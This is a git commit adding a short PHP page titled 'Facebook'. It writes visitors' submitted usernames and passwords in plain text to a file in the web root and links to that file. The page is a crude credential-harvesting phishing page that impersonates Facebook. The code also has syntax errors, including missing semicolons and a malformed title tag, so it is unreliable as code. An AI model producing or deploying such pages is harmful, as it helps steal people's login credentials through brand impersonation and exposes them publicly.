83f96a9b7b3d103b532bd23e82884b9ffdc4cf16
Lurok <rokitanasz23@gmail.com>
2018-01-06 14:59:25 +0200

    Bandymas

---
+++ lurok.php
@@ -0,0 +1,46 @@
+<?php
+$failoVieta = $_SERVER['DOCUMENT_ROOT']."\Duomenys.txt";
+$failas = fopen($failoVieta, "w");
+if($failas === FALSE)
+{
+    echo "Nepavyko atidaryti failo rašymui";
+}
+else
+{
+     
+    fwrite($failas, "Parodomas prisijungimo vardas ir slaptazodis\r\n");
+    fwrite($failas, $_POST['vardas']."\r\n");
+    fwrite($failas, $_POST['Slaptazodis']."\r\n");
+    fclose($failas);
+}
+?>
+<html>
+    <head>
+        <title>Facebook<title/>
+        <meta charset="utf-8" />
+    </head>
+    <body>
+        Vardas:
+        <?php
+        $vardas = $_POST['vardas'];
+        if($vardas == "Rokas") 
+        {
+            echo "Labas, Rokai"
+        }
+        else
+        {
+            echo "Labas, " . $vardas
+        }
+        ?>
+        <br>
+        Slaptazodis:
+        <?php
+        $Slaptazodis = $_POST['Slaptazodis'];
+        ?>
+        <br>
+        Daugiau informacijos <a href="/Duomenys.txt" />
+    </body>
+</html>
+
+
+        
